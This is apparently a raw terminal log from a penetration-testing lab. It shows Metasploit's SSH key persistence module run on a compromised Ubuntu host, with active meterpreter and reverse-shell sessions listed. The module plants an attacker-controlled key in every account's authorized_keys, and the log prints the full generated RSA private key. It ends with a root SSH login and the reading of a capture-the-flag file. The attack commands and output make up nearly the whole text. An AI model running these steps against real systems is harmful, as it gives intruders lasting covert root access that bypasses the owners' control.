[+] Key Added
[*] Adding key to /nonexistent/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/sshd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/netif/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/resolve/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/games/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/sbin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/backups/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/cache/man/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/lib/gnats/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/list/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/mail/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/run/ircd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/lpd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/news/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/uucp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/www/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed
msf5 post(linux/manage/sshkey_persistence) >
```

```
msf5 exploit(linux/local/service_persistence) > use post/linux/manage/sshkey_persistence 
msf5 post(linux/manage/sshkey_persistence) > options

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION                                yes       The session to run this module on.
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)

msf5 post(linux/manage/sshkey_persistence) > info

       Name: SSH Key Persistence
     Module: post/linux/manage/sshkey_persistence
   Platform: Linux
       Arch: 
       Rank: Excellent

Provided by:
  h00die <mike@shorebreaksecurity.com>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name             Current Setting       Required  Description
  ----             ---------------       --------  -----------
  CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
  PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
  SESSION                                yes       The session to run this module on.
  SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
  USERNAME                               no        User to add SSH key to (Default: all users on box)

Description:
  This module will add an SSH key to a specified user (or all), to 
  allow remote login via SSH at any time.

msf5 post(linux/manage/sshkey_persistence) > set createsshfolder true 
createsshfolder => true
msf5 post(linux/manage/sshkey_persistence) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.199.49.3:22)                                         192.199.49.2:35169 -> 192.199.49.3:22 (192.199.49.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.199.49.3  192.199.49.2:4433 -> 192.199.49.3:57502 (192.199.49.3)
  3         shell cmd/unix                                                                                       192.199.49.2:4444 -> 192.199.49.3:47752 (192.199.49.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.199.49.3              192.199.49.2:4433 -> 192.199.49.3:38860 (192.199.49.3)

msf5 post(linux/manage/sshkey_persistence) > set session 4
session => 4
msf5 post(linux/manage/sshkey_persistence) > run

[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[*] Creating /bin/.ssh folder
[*] Creating /dev/.ssh folder
[*] Creating /home/ftp/.ssh folder
[*] Creating /home/ftp
/.ssh folder
[*] Creating /home/jackie/.ssh folder
[*] Creating /nonexistent/.ssh folder
[*] Creating /root/.ssh folder
[*] Creating /run/sshd/.ssh folder
[*] Creating /run/systemd/netif/.ssh folder
[*] Creating /run/systemd/resolve/.ssh folder
[*] Creating /usr/games/.ssh folder
[*] Creating /usr/sbin/.ssh folder
[*] Creating /var/backups/.ssh folder
[*] Creating /var/cache/man/.ssh folder
[*] Creating /var/lib/gnats/.ssh folder
[*] Creating /var/list/.ssh folder
[*] Creating /var/mail/.ssh folder
[*] Creating /var/run/ircd/.ssh folder
[*] Creating /var/spool/lpd/.ssh folder
[*] Creating /var/spool/news/.ssh folder
[*] Creating /var/spool/uucp/.ssh folder
[*] Creating /var/www/.ssh folder
[+] Storing new private key as /root/.msf4/loot/20230808180854_LinuxPersistence_192.199.49.3_id_rsa_100348.txt
[*] Adding key to /bin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /dev/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/ftp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/jackie/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /nonexistent/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/sshd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/netif/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/resolve/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/games/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/sbin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/backups/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/cache/man/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/lib/gnats/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/list/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/mail/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/run/ircd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/lpd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/news/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/uucp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/www/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed
msf5 post(linux/manage/sshkey_persistence) > loot

Loot
====

host          service  type    name        content     info                      path
----          -------  ----    ----        -------     ----                      ----
192.199.49.3           id_rsa  ssh_id_rsa  text/plain  OpenSSH Private Key File  /root/.msf4/loot/20230808180854_LinuxPersistence_192.199.49.3_id_rsa_100348.txt

msf5 post(linux/manage/sshkey_persistence) > cat /root/.msf4/loot/20230808180854_LinuxPersistence_192.199.49.3_id_rsa_100348.txt
[*] exec: cat /root/.msf4/loot/20230808180854_LinuxPersistence_192.199.49.3_id_rsa_100348.txt

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsCpuoXtzVolypXmkibpTRYRyC7H5UPDmrmR0YD2CF07gLkwc
5/89Rkqljj0/KyCVpjHSo39bDsf+OhiMMbQyIuOZ6Rehr4HQmmjKSBlFgsgj5FLJ
YZ6BAV/1NhECC1rEduR8BwOg65+igI+Evj2twPSO1axyZyUqESwkZyd58CFaAYj0
uyjADHC0Zs4FBhCvXkpwwi+o9NA7HKC0NwFP/08p6xe4efbUkBQXx35YWJK44+Et
ETNIQlk4PH37Wo7mcvL34QGqK1lW96+2R7LsWXMcFDadbrGaQ5hPb2ivN6kgRQnz
cTjrr0x8JQL9OSeCjyKc0JCWbErphyTwDsfLAQIDAQABAoIBAFYThZbVkReZdTEx
bJn3NrTi8C6SuXU5IB3Z65sSsrvcyGEWw5D//9qWoqoLdxAFjdl0wq0sjzt7sNaG
JAotN8ogV5Wy/EebMGgiB6SO5I3waMkpQki2f+ZCErhmOw99PD2zin6K4Vf/2hDj
D0M9M+byF9CDwCpx2EonvWnBuiz/7q6du9v28kH12LewjDRGyYNwtiaf+vtCl2/z
jSObCPp3johk4emp8z/hzEJ5O0DJvLvTIyKRHHgAKoNVGgAIlTgUFpkjzPZlJ/52
qmFRXpaaIuvBi6e5hjFTNzgDuAQjktroVC0fOLrhgH8Vm3GZmffJI7EcyoeoC5h7
zVIWVoECgYEA5S/C1y2HY0duP0dIPgl6kih1v//cs2z/Lv3wg8IPohMcHuaed+No
upONl9HBZldZL5RXjx10swhxKl+z+GFCeWgZVblHDxDCtd4D1HR9YnVUGTJghaKW
eweO8kCtRt4PPS8waGlzZ/a8ODBO9YHKiCx+s982cWRTjRkxH0xbTgkCgYEAxMas
l9sG06wthsdZXFVZdBe82qfUSAYd/zJIaXLIvivlM1eW1FqpTrgyLDUTGKZqToGy
NJZBOIdunRBjguy+FPAKxzlQS00Ywr6DR3/P/kJi884unOEvnt4zqqOzPKtO6Bog
GAqzzMYez/ugKuX+qZDW83YnKJfUq78qVuyS0zkCgYBQDfrVBsY/23ebCt8lLFJw
M0nOIyWIVw5b77/Phj3Hsz0jXhMEdZ7jbR8MZOxVPzWb9QkQqI1W7B/7WSqYHAEI
P2B6HRnBHW2l8UMNNxOFDM6vbnVguIYvu1gnLohYNMDF8nHKRutU6U6doeIyx39j
SYeIdPOjcBPvOVl7QUSzYQKBgQCldz8Iztf1xLHfxOACwY5gDdnzr+7UxbgRsPGt
IiVlrLmmK8AcP0RheohOHi85qi54Z503lSWw6El+b5qOLI9GQfd+QVagi2sHz3XK
+NIoxyA4Tadqqf0GRWkC03bTzGWkzNsx/EXnKq4cTEYJ7K7xXWczAKa6/rmJ1k0/
HN32GQKBgQCgcR8mX1JCR31UE+GBFuiKLdarn8oBPCSz9hpwefAH8WexMkGhqj4T
nPeNIZY6dXH6RfLq/2oSyF0qdCqn8m1liXN7F5PYP2jJfkZKf3dboHLZecXUerUk
zB1Et8vJM/xbylaDf9vPHvqNR3GUJ5p/N72cGRMKnuv+YWGxC1hG6Q==
-----END RSA PRIVATE KEY-----
msf5 post(linux/manage/sshkey_persistence) > exit -y
root@attackdefense:~# vim ssh_key
root@attackdefense:~# chmod 0400 ssh_key 
root@attackdefense:~# ssh -i ssh_key root@192.199.49.3
The authenticity of host '192.199.49.3 (192.199.49.3)' can't be established.
ECDSA key fingerprint is SHA256:oqLzK4Uz72ljNbol98v3RyT8BJDLVMAZql/uLIsuonI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.199.49.3' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@victim-1:~# ls
flag
root@victim-1:~# cat flag 
9db8bf8f483ff50857f26f9bd636bed6
root@victim-1:~#
```

```
root@attackdefense:~# ssh -i ssh_key ftp@192.199.49.3
ftp@192.199.49.3's password: 
Permission denied, please try again.
ftp@192.199.49.3's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
ftp@victim-1:~$
```

